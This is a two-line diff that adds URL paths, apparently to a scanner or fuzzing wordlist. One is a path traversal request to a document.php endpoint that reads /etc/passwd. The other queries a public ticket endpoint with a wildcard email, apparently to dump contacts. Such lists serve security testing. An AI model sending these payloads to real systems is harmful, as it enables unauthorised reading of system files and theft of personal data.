@@ -1,0 +1,2 @@
+/document.php?modulepart=project&file=../../../../../../../etc/passwd
+/public/ticket/ajax/ajax.php?action=getContacts&email=%
